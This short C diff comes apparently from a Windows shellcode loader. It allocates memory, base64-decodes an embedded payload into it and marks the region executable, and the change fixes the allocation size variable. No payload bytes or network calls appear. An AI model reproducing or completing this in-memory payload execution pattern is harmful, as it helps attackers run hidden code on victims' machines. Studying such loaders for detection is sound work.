@@ -29,7 +29,7 @@ int main(void) {
         HANDLE th;
         DWORD oldprotect = 0;
 
-        exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        exec_mem = VirtualAlloc(0, pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         DecodeBase64((const BYTE *)payload, pay_len, (char *) exec_mem, pay_len);
         rv = VirtualProtect(exec_mem, pay_len, PAGE_EXECUTE_READ, &oldprotect);
         if ( rv != 0 ) {
